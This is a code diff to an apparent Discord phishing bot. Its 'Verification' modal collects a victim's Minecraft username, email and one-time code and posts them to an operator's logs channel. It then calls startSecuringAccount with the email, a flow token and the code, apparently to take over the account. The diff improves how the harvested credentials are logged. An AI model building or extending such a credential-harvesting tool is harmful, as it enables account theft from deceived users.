@@ -1,5 +1,6 @@
 from views.utils.startSecure import startSecuringAccount
 from discord import ui
+import datetime
 import discord
 import json
 
@@ -20,12 +21,17 @@ class MyModalTwo(ui.Modal, title="Verification"):
 
         logs_channel = interaction.client.get_channel(config["discord"]["logs_channel"])
         Code_embed = discord.Embed(
-            title="Got OTP Verication",
-            description=f"**Email**\n```{data['email']}```\n**Code**\n```{self.box_three.value}```\n**Status**\n```Securing...```",
-            colour=0x008000
+            title = f"{interaction.user.name} | {interaction.user.id}",
+            description=f"**Username** | **Email** | **Status**\n```{self.username.value} | {self.email.value} | Got Code! {self.box_three.value}```",
+            timestamp = datetime.datetime.now(),
+            colour = 0x79D990,                           
+        ).set_thumbnail(
+            url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
         )
 
+        await logs_channel.send("**This Account is being automaticly secured.**")
         await logs_channel.send(embed=Code_embed)
+
         startSecuringAccount(data["email"], data["flowtoken"], self.box_three.value)
 
         await interaction.response.send_message(
